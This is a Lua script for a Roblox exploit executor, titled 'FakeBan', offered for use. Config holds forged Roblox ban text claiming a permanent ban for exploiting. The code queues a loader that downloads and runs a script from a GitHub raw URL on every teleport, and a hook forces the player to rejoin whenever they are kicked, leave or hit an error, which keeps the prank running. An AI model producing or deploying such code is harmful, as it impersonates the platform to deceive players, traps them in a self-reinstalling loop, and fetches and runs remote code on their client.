-- =========================
--  FakeBan (queue-safe rewrite)
--
--  Reuses the queue_on_teleport wrapper + GuiService.ErrorMessageChanged
--  kick detection + single-instance lease from AutoCandyFarm.
--
--  Flow:
--    1. Show a fake Roblox ban dialog.
--    2. Attempt a client-side Kick carrying the fake ban message.
--       (If the executor allows LocalPlayer:Kick, the native Roblox
--        disconnect dialog becomes the "ban message".)
--    3. Whatever the player does next - kick, manual leave, reconnect,
--       or a real error from the server - the script is queued through
--       queue_on_teleport and rejoined. On rejoin the loader pulls
--       https://raw.githubusercontent.com/goldoomen310-cpu/no/refs/heads/main/fakeb
--       and runs this same script again.
--
--  Set getgenv().__fakeban_force = true to replace an existing instance.
-- =========================

local Players         = game:GetService("Players")
local GuiService      = game:GetService("GuiService")
local TeleportService = game:GetService("TeleportService")
local HttpService     = game:GetService("HttpService")

-- The queued loader can run before Players.LocalPlayer exists.
local LocalPlayer
do
    local deadline = tick() + 120
    while not Players.LocalPlayer and tick() < deadline do
        task.wait(0.1)
    end
    LocalPlayer = Players.LocalPlayer
end
if not LocalPlayer then
    warn("[FakeBan] LocalPlayer unavailable; aborting")
    return
end

-- ==================== SINGLE-INSTANCE GUARD ====================
local genv      = getgenv()
local LEASE_KEY = "__fakeban_lease"
local leaseToken
do
    local now   = tick()
    local force = genv.__fakeban_force == true
    genv.__fakeban_force = nil

    local lease = genv[LEASE_KEY]
    local fresh = type(lease) == "table"
        and lease.alive == true
        and type(lease.id) == "string"
        and type(lease.heartbeat) == "number"
        and now - lease.heartbeat < 15
        and lease.jobId == game.JobId

    if fresh and not force then
        print("[FakeBan] already running; duplicate execution ignored"
            .. " (set getgenv().__fakeban_force = true to replace it)")
        return
    end

    leaseToken = tostring(now) .. ":" .. tostring(math.random(100000, 999999))
        .. ":" .. tostring(game.JobId or "")
    genv[LEASE_KEY] = {
        alive = true, heartbeat = now, id = leaseToken, jobId = game.JobId,
    }
end

-- ==================== CONFIG ====================
local Config = {
    DebugLog        = false,
    AutoRejoin      = true,
    ScriptUrl       = "https://raw.githubusercontent.com/goldoomen310-cpu/no/refs/heads/main/fakeb",
    BanTitle        = "You have been banned from Roblox",
    BanReason       = "Exploiting / Unauthorized third-party software",
    BanDuration     = "Permanent",
    BanAppealNote   = "If you believe this action was taken in error, you may appeal via the Roblox Support page.",
    -- Delay before the kick attempt so the custom GUI is painted first
    KickDelay       = 0.6,
    -- How often the lease heartbeat refreshes
    LeaseInterval   = 0.5,
}

local function dbg(...)
    if Config.DebugLog then print("[FakeBan]", ...) end
end

-- ==================== REJOIN QUEUE (from AutoCandyFarm) ====================
local Rejoin = { conn = nil, started = false }

function Rejoin.queue()
    local url = tostring(Config.ScriptUrl or "")
    if url == "" then return false end

    local env = getgenv()
    local queue = env.queue_on_teleport or env.queueonteleport
        or env.queue_on_tp or env.queueontp
    if type(queue) ~= "function" then
        dbg("re-execution queue unavailable")
        return false
    end

    local loader = string.format([[
local url = %q
local source
for _ = 1, 8 do
    local ok, body = pcall(function() return game:HttpGet(url) end)
    if ok and type(body) == "string" and #body > 0 then
        source = body
        break
    end
    task.wait(2)
end
if source then
    local fn, err = loadstring(source)
    if fn then
        fn()
    else
        warn("[FakeBan] re-execute compile failed: " .. tostring(err))
    end
else
    warn("[FakeBan] re-execute download failed")
end
]], url)

    local ok = pcall(queue, loader)
    dbg("queued re-execution", ok and "ok" or "failed")
    return ok
end

function Rejoin.attempt(reason)
    if not Config.AutoRejoin then return false end
    if Rejoin.started then return false end
    Rejoin.started = true
    dbg("auto-rejoin triggered", tostring(reason))

    Rejoin.queue()
    task.wait(0.1)

    local ok = pcall(function()
        TeleportService:Teleport(game.PlaceId, LocalPlayer)
    end)
    dbg("rejoin teleport", ok and "sent" or "failed")
    return ok
end

-- Kick / leave detection - identical to AutoCandyFarm's Rejoin.setup().
-- Fires on kick, disconnect, or any server error message.
function Rejoin.setup()
    if not Config.AutoRejoin or Rejoin.conn then return end
    local ok, connection = pcall(function()
        return GuiService.ErrorMessageChanged:Connect(function(errorMessage)
            if type(errorMessage) ~= "string" or errorMessage == "" then return end
            print("[FakeBan] Error detected: " .. tostring(errorMessage))
            if LocalPlayer then
                Rejoin.attempt("GuiService: " .. tostring(errorMessage))
            end
        end)
    end)
    if ok and connection then
        Rejoin.conn = connection
    else
        dbg("GuiService.ErrorMessageChanged unavailable:", tostring(connection))
    end
end

Rejoin.setup()

